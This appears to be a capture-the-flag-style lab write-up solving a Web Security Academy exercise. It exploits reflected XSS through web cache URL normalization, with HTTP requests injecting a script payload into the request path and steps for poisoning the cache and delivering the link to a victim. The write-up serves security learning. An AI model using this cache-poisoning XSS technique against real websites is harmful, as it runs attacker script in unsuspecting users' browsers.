## URL normalization

This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.

To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute alert(1) in the victim's browser. Then, deliver the malicious URL to the victim.

## Notes

- Possibility to leave a comment
- X-Cache Header
- Cache-Control Header
- reflected word in response
- `X-Cache-Key : /$$`
- Deliver url to victim

## Resume

1. Identify reflected path in error message  
2. Inject XSS payload into request line  
3. Confirm encoding difference between browser and cache  
4. Poison cache with decoded payload  
5. Trigger cached execution in browser  
6. Deliver link to victim  

## Solve

In Burp Repeater, we first test a non-existent path to observe how the application handles errors:

```http
GET /random HTTP/2
Host: 0a96002004ffe16f807212770013008d.web-security-academy.net
```

We notice that the requested path is reflected in the response body.

Next, we inject a reflected XSS payload directly into the request line:

```http
GET /a</p><script>alert(1)</script><p>aaa HTTP/2
Host: 0a96002004ffe16f807212770013008d.web-security-academy.net
```

We observe the response:

```html
<p>Not Found: /a</p><script>alert(1)</script><p>aaa</p>
```

This confirms that the path is directly reflected without proper sanitization.

However, if the same URL is used directly in the browser, the payload does not execute due to URL encoding.

Next, we send the malicious request in Burp Repeater and observe cache behavior:

```http
HTTP/2 404 Not Found
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=10
Age: 2
X-Cache: hit
Content-Length: 55
```

We confirm that:
- the response is cached
- the cache stores the decoded version of the payload

This creates a mismatch between browser encoding and cache decoding behavior.

We then immediately load the same URL in the browser. This time, the cached response is returned and the payload executes successfully.

Finally, we re-poison the cache and use “Deliver link to victim” with the same malicious URL.

The lab is solved when the victim visits the link and `alert(1)` executes.